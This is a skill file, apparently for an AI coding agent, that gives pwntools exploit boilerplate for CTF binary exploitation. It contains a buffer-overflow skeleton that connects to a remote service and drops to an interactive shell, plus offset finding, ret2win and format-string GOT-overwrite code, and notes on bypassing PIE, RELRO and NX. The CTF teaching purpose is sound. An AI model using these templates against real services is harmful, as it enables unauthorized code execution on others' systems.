---
name: ctf-pwntools-boilerplate
description: "Pwntools exploit boilerplate for CTF binary exploitation. Provides ready-to-use templates for remote/local process interaction, ROP chain construction, format string attacks, shellcode generation, and interactive shell management. Use when writing binary exploits, when connecting to challenge services with pwntools, when building ROP chains, when exploiting format string vulnerabilities, or when automating pwn challenge solves."
tags:
  - ctf
  - pwntools
  - binary-exploitation
  - rop
  - format-string
  - shellcode
  - pwn
triggers:
  - pwntools exploit
  - binary exploit template
  - rop chain
  - format string exploit
  - pwn challenge
  - buffer overflow exploit
  - ctf binary
category: exploit
os: linux
---

# ctf-pwntools-boilerplate

## When to Use

- Writing a binary exploitation script for a CTF challenge
- Connecting to a remote challenge service via TCP
- Building a ROP chain to bypass NX/DEP
- Exploiting a format string vulnerability for arbitrary read/write
- Crafting shellcode for shellcode injection challenges
- Automating interaction with a challenge binary (local or remote)
- Leaking libc addresses for ret2libc or one_gadget attacks
- Exploiting heap vulnerabilities (use-after-free, double free, tcache poisoning)
- Debugging an exploit locally before targeting remote

## Quick Start

```python
from pwn import *

# Local binary
p = process('./challenge')

# Remote service
p = remote('challenge.ctf.com', 1337)

# Send payload + get flag
p.sendline(b'A' * 64 + p64(0xdeadbeef))
p.interactive()
```

## Exploit Template — Standard Skeleton

Every pwntools exploit should follow this structure:

```python
#!/usr/bin/env python3
from pwn import *

# === Configuration ===
BINARY = './challenge'
HOST = 'challenge.ctf.com'
PORT = 1337

elf = ELF(BINARY)
context.binary = elf
context.log_level = 'info'  # 'debug' for full I/O trace

# Libc (if needed)
# libc = ELF('./libc.so.6')

def conn():
    """Switch between local and remote."""
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(BINARY)

# === Exploit ===
def exploit():
    p = conn()

    # --- Stage 1: Leak ---
    # p.sendlineafter(b'> ', b'1')
    # leak = u64(p.recv(6).ljust(8, b'\x00'))
    # log.success(f'Leak: {hex(leak)}')

    # --- Stage 2: Payload ---
    offset = 64  # Offset to return address (find with cyclic)
    payload = flat(
        b'A' * offset,
        # p64(rop_gadget),
        # p64(target_function),
    )
    p.sendline(payload)

    # --- Stage 3: Shell ---
    p.interactive()

if __name__ == '__main__':
    exploit()
```

**Usage:** `python3 exploit.py` (local), `python3 exploit.py REMOTE`, `python3 exploit.py GDB`

## Finding the Offset

```python
from pwn import *
p = process('./challenge')
p.sendline(cyclic(200))
p.wait()
# Check crash address in dmesg or core dump
# offset = cyclic_find(fault_addr)
```

## Technique Reference Files

Full templates with copy-paste code are in the `references/` directory — loaded on demand, not into context:

| Technique            | Reference File                                               | Key Templates                                                                    |
| -------------------- | ------------------------------------------------------------ | -------------------------------------------------------------------------------- |
| **ROP Chains**       | [references/rop-chains.md](references/rop-chains.md)         | ret2win, ret2libc (leak+system), one_gadget                                      |
| **Format Strings**   | [references/format-strings.md](references/format-strings.md) | Arbitrary read, GOT overwrite, FmtStr auto-detect                                |
| **Shellcode & Heap** | [references/shellcode-heap.md](references/shellcode-heap.md) | execve shellcode, tcache poisoning, interaction patterns, GDB attach, retry loop |

> **Usage**: When you need a specific technique, read the corresponding reference file for the full template.

## Common Pitfalls

- **Stack alignment on x86_64**: Ubuntu requires 16-byte aligned RSP before `system()`. Add a `ret` gadget.
- **Null bytes in payload**: `scanf("%s")` / `gets()` stop at `\x00`. Use ROP or null-free shellcode.
- **PIE enabled**: Leak a code address first, calculate base, then use offsets.
- **RELRO full**: GOT is read-only. Use `__malloc_hook`, `__free_hook` (glibc < 2.34), or ROP.
- **Seccomp/sandbox**: `seccomp-tools dump ./binary` to see allowed syscalls.

## Examples

### ret2win

```python
from pwn import *
elf = ELF('./ret2win')
context.binary = elf
p = process(elf.path)
p.sendlineafter(b'> ', flat(b'A' * 40, elf.symbols['win']))
print(p.recvall().decode())
```

### Format String GOT Overwrite

```python
from pwn import *
elf = ELF('./fmtstr')
context.binary = elf
p = process(elf.path)
payload = fmtstr_payload(6, {elf.got['exit']: elf.sym['win']}, write_size='short')
p.sendline(payload)
p.interactive()
```
